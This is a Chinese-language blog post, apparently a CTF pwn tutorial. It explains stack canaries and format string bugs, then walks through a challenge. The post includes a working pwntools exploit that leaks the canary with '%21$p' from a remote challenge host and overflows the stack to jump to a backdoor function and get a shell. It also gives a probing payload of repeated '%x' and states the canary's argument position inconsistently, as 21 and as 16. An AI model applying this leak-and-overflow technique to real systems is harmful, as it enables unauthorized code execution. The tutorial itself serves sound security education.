{"title":"CANARY(bypass1): 格式化字符串漏洞","uid":"6305599be3907855ef6ac9a4a58f6cab","slug":"CANARY-bypass1-格式化字符串漏洞","date":"2022-11-05T07:18:49.000Z","updated":"2022-11-19T06:58:42.602Z","comments":true,"path":"api/articles/CANARY-bypass1-格式化字符串漏洞.json","keywords":"DevOps, Web, Pwn, Electronics","cover":[],"content":"<h1 id=\"CANARY-bypass1-格式化字符串漏洞\"><a href=\"#CANARY-bypass1-格式化字符串漏洞\" class=\"headerlink\" title=\"CANARY (bypass1):  格式化字符串漏洞\"></a>CANARY (bypass1):  格式化字符串漏洞</h1><p>CANARY 保护机制简介及格式化字符漏洞利用方法</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by DuskyJuniXor</p>\n<hr>\n<h2 id=\"CANARY-是什么\"><a href=\"#CANARY-是什么\" class=\"headerlink\" title=\"CANARY 是什么\"></a>CANARY 是什么</h2><ul>\n<li>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</li>\n<li>canary 是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从 fs&#x2F;gs 寄存器中获取一个值，一般存到 EBP - 0x4(32位) 或 RBP - 0x8(64位) 的位置。当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致 canary 的值发生变化，那么程序将执行 ___stack_chk_fail 函数，继而终止程序。</li>\n</ul>\n<hr>\n<h2 id=\"CANARY-特点\"><a href=\"#CANARY-特点\" class=\"headerlink\" title=\"CANARY 特点\"></a>CANARY 特点</h2><ul>\n<li><p>canary 一般最高位是 \\x00，64 位程序的 canary 大小是 8 个字节，32 位的是 4 个字节，canary 的位置不一定就是与ebp 存储的位置相邻，具体得看程序的汇编操作</p>\n<ul>\n<li><p>Canary 值在 rbp 到 rsp 之间（并不一定是rbp-8的位置）</p>\n</li>\n<li><p>Canary 值以 0x00 结尾,如果程序没有漏洞但栈上面刚好是一个满的字符串,这个 0x00 可以当做截断,避免被打印出来</p>\n</li>\n<li><p>Canary 值如果被改写,程序会崩溃</p>\n</li>\n</ul>\n</li>\n<li><p>含有 CANARY 保护的栈分布</p>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_1.jpeg\" class title=\"canary1_1\">\n</li>\n<li><p>CANARY 在 ida pro 中的体现</p>\n</li>\n</ul>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_2\" class title=\"canary1_2\">\n\n<hr>\n<h2 id=\"格式化字符串漏洞\"><a href=\"#格式化字符串漏洞\" class=\"headerlink\" title=\"格式化字符串漏洞\"></a>格式化字符串漏洞</h2><h4 id=\"先了解下什么是格式化字符串漏洞\"><a href=\"#先了解下什么是格式化字符串漏洞\" class=\"headerlink\" title=\"先了解下什么是格式化字符串漏洞\"></a>先了解下什么是格式化字符串漏洞</h4><ul>\n<li><p>C 语言中有一个非常常用的用于向屏幕输出字符的函数：printf。</p>\n</li>\n<li><p>printf 的第1个参数是字符串，被称为格式化字符串。程序员可以在该字符串中使用 %d、%s、%c 等占位符，printf 将依据这些占位符和其他参数整合出一个完整的字符串并输出。</p>\n</li>\n<li><p>补充：C 语言中的常见占位符</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">%d &#x2F;&#x2F; 十进制 - 输出十进制整数\n\n%s &#x2F;&#x2F; 字符串 - 从内存中读取字符串\n\n%x &#x2F;&#x2F; 十六进制 - 输出十六进制数\n\n%c &#x2F;&#x2F; 字符 - 输出字符\n\n%p &#x2F;&#x2F; 指针 - 指针地址\n\n%n &#x2F;&#x2F; 到目前为止所写的字符数</code></pre></li>\n</ul>\n<p>例如：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">int a &#x3D; 0;\nprintf(&quot;a &#x3D; %d&quot;, a);</code></pre>\n\n<p>显然当你运行 c 代码时，会输出 “a &#x3D; 0” 那么，当此处有程序员不小心写成了这样：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">printf(&quot;a &#x3D; %d&quot;);</code></pre>\n\n<p>会怎么样呢？</p>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_3.png\" class title=\"canary1_3\">\n\n<p>我们发现终端输出了一个意想不到的数字 11932576</p>\n<ul>\n<li><p>之所以会出现上面的现象，主要是因为 printf 不会检查格式化字符串中的占位符是否与所给的参数数目相等。而在 printf 输出的过程中，每遇到一个占位符，就会到“约定好”的位置获取数据并根据该占位符的类型解码并输出。</p>\n</li>\n<li><p>也就是说，当我们在 printf() 函数中有 a 时，参数 %d 和 a 依次被 rdi、rsi 传入栈中，printf() 函数正常按照 %d 所规定的方式来输出 a。但当 printf() 函数中没有参数 a 时，printf() 函数并不知道这一点，它将仍输入它的第二个参数，尽管这个参数可能来源于其它地方。</p>\n</li>\n</ul>\n<h4 id=\"利用方法\"><a href=\"#利用方法\" class=\"headerlink\" title=\"利用方法\"></a>利用方法</h4><ul>\n<li>因为通过格式化字符串漏洞可以实现任意内存的读写，而且，在一个程序里，不同函数在运行中使用的canary值是相同的，所以可以利用格式化字符串漏洞泄露 canary 的值，并在栈溢出时用此 canary 覆盖 canary 的位置，从而绕过 canary 保护机制，使程序正常返回</li>\n</ul>\n<h4 id=\"例题：canary\"><a href=\"#例题：canary\" class=\"headerlink\" title=\"例题：canary\"></a>例题：<a href=\"CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary\">canary</a></h4><ul>\n<li><p>首先 checksec 下，发现开启了 canary 保护、NX 保护</p>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_4.png\" class title=\"canary1_4\">\n</li>\n<li><p>文件拖入 ida pro 分析，发现明显的格式化字符串漏洞以及明显的可利用的 backdoor 函数</p>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_5.png\" class title=\"canary1_5\">\n</li>\n<li><p>查看栈区，分析 buf 大小和 canary 位置</p>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_6.png\" class title=\"canary1_6\">\n\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_7.png\" class title=\"canary1_7\">\n</li>\n<li><p>确定 canary 在 printf 函数的第几个参数以打印出 canary 的值</p>\n<ul>\n<li><p>方法一：计算法</p>\n<p>x64 下有 5 个参数是由寄存器传递的，其它参数由栈传递。由上图知 buf 栈大小为 0x40，除以 4 得共 16 个 qword 地址，再结合 canary  (即var_8) 的位置，可得出 canary 应该是在 printf() 的第 21 个参数的位置。</p>\n</li>\n<li><p>方法二：gdb 调试法</p>\n<p>开启 gdb 调试或直接运行，输入AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x，查看 41414141 (AAAA ascii 码) 出现位置，是第16个，再加上 x64 下 5 个由寄存器传递的参数，可得 canary 在第 16 个参数</p>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_8.png\" class title=\"canary1_8\"></li>\n</ul>\n</li>\n<li><p>编写 exp.py</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from pwn import *\ncontext(arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;, log_level &#x3D; &#39;debug&#39;)\n\nbackdoor_addr &#x3D; 0x401244\np &#x3D; remote(&quot;119.3.83.106&quot;, 10545)\np.recv()\np.sendline(b&#39;%21$p&#39;)\np.recvuntil(b&quot;hello, &quot;)\ncanary &#x3D; int(p.recvuntil(b&#39;00&#39;), 16)\nprint(f&#39;canary &#x3D; &#123;hex(canary)&#125;&#39;)\np.recvuntil(b&quot;comment:&quot;)\npayload &#x3D; b&#39;A&#39;*64 + b&#39;A&#39;*56 + p64(canary) + b&#39;A&#39;*8 + p64(backdoor_addr)\np.sendline(payload)\np.interactive()</code></pre>\n\n<ul>\n<li><p>注：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&quot;%k$x&quot; 表示访问第k个参数，并且把它以十六进制输出\n&quot;%k$d&quot; 表示访问第k个参数，并且把它以十进制输出</code></pre></li>\n</ul>\n</li>\n<li><p>成功 getshell!</p>\n<img src=\"/post/CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/canary1_9.png\" class title=\"canary1_9\"></li>\n</ul>\n","text":"CANARY (bypass1): 格式化字符串漏洞CANARY 保护机制简介及格式化字符漏洞利用方法 ​ ——by DuskyJuniXor CANARY 是什么 Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":2,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CANARY-bypass1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">CANARY (bypass1):  格式化字符串漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CANARY-%E6%98%AF%E4%BB%80%E4%B9%88\"><span class=\"toc-text\">CANARY 是什么</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CANARY-%E7%89%B9%E7%82%B9\"><span class=\"toc-text\">CANARY 特点</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">格式化字符串漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%88%E4%BA%86%E8%A7%A3%E4%B8%8B%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">先了解下什么是格式化字符串漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">利用方法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98%EF%BC%9Acanary\"><span class=\"toc-text\">例题：canary</span></a></li></ol></li></ol></li></ol></li></ol>","author":{"name":"DuskyJuniXor","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一边学习一边随手mark的萌新","socials":{"github":"https://github.com/DuskyJuniXor","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://space.bilibili.com/330711030?spm_id_from=333.1007.0.0"}}}},"mapped":true,"prev_post":{},"next_post":{}}